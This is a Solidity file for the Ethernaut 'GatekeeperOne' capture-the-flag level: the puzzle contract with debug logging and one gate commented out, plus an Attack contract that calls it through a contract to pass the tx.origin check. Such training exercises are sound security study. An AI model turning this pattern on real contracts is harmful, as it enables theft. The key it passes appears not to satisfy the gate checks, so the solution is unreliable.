//Passez le portier(Gatekeeper) et inscrivez-vous comme participant pour réussir ce niveau.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {console} from "forge-std/console.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        console.log("gateone passed msg.sender != tx.origin");
        _;
    }

    // modifier gateTwo() {
    //     console.log("gasleft() % 8191 == 0 part");
    //     require(gasleft() % 8191 == 0);
    //     console.log("gasleft() % 8191 == 0 passed");
    //     _;
    // }

    modifier gateThree(bytes8 _gateKey) {
        console.log("uint32(uint64(_gateKey))", uint32(uint64(_gateKey)));
        console.log("uint16(uint64(_gateKey)", uint16(uint64(_gateKey)));
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        console.log(" uint32(uint64(_gateKey))", uint32(uint64(_gateKey)));
        console.log("uint64(_gateKey)", uint64(_gateKey));
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        console.log("uint32(uint64(_gateKey))", uint32(uint64(_gateKey)));
        console.log("uint16(uint160(tx.origin))", uint16(uint160(tx.origin)));
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );

        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne /*gateTwo*/ gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    GatekeeperOne gate;

    constructor(address _gate) {
        gate = GatekeeperOne(_gate);
    }

    function attack() external {
        console.log("msg.sender is  ", msg.sender);
        console.log("address this is ", address(this));
        //gate.enter(bytes8(uint64(uint160(address(this)))));
        gate.enter(bytes8(uint64(uint160(address(1)))));
    }
}
